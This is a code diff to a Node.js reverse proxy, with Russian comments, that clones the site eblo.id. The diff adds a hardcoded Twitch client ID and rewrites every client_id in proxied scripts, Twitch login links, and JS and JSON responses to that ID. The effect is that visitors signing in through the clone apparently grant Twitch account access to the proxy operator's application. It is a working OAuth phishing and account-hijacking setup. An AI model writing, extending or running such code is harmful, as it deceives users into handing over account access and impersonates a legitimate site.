@@ -9,6 +9,9 @@ const PORT = 3000;
 // Укажи здесь оригинальный сайт
 const TARGET_SITE = 'https://eblo.id';
 
+// Twitch Client ID для подмены
+const TWITCH_CLIENT_ID = 'smud76lk22seeawljfzll7qypkchsi';
+
 // Функция для конвертации абсолютных URL в относительные
 function convertToRelative(html, targetUrl) {
   const $ = cheerio.load(html);
@@ -101,6 +104,24 @@ function convertToRelative(html, targetUrl) {
       <span class="auth-btn-text">Открыть на eblo.id</span>
     </a>
   `);
+  
+  // Подменяем Twitch Client ID в скриптах и ссылках
+  $('script').each((i, elem) => {
+    const scriptContent = $(elem).html();
+    if (scriptContent && scriptContent.includes('client_id')) {
+      const modifiedScript = scriptContent.replace(/client_id['":\s=]+[a-z0-9]+/gi, `client_id="${TWITCH_CLIENT_ID}"`);
+      $(elem).html(modifiedScript);
+    }
+  });
+  
+  // Подменяем в ссылках на авторизацию Twitch
+  $('a[href*="twitch"]').each((i, elem) => {
+    let href = $(elem).attr('href');
+    if (href && href.includes('client_id')) {
+      href = href.replace(/client_id=[a-z0-9]+/gi, `client_id=${TWITCH_CLIENT_ID}`);
+      $(elem).attr('href', href);
+    }
+  });
   
   // Добавляем стили
   $('head').append(`
@@ -199,6 +220,14 @@ app.use(async (req, res) => {
       
       res.set('Content-Type', 'text/html; charset=utf-8');
       res.send(modifiedHtml);
+    } else if (contentType.includes('javascript') || contentType.includes('application/json')) {
+      // Подменяем Client ID в JS и JSON файлах
+      let content = response.data.toString('utf-8');
+      content = content.replace(/client_id['":\s=]+[a-z0-9]+/gi, `client_id="${TWITCH_CLIENT_ID}"`);
+      
+      res.set('Content-Type', contentType);
+      res.status(response.status);
+      res.send(content);
     } else {
       // Для остальных типов (CSS, JS, изображения, файлы) отдаём как есть
       res.set('Content-Type', contentType);
